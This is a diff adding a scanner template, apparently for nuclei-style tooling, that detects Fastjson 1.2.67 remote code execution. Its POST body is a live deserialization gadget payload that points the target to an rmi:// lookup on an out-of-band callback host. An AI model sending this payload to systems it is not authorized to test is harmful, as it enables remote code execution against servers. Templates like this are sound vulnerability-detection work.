@@ -1,0 +1,36 @@
+id: fastjson-1-2-67-rce
+brief:
+    title: Fastjson 1.2.67 - Remote Code Execution
+    by: zh
+    level: critical
+    about: Fastjson 1.2.67 is susceptible to a remote code execution vulnerability.
+    label:
+        - fastjson
+        - rce
+        - deserialization
+        - oast
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+           "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
+           "properties":{
+              "@type":"java.util.Properties",
+              "UserTransaction":"rmi://{{interactsh-url}}/Exploit"
+           }
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": status
+          status:
+            - 200
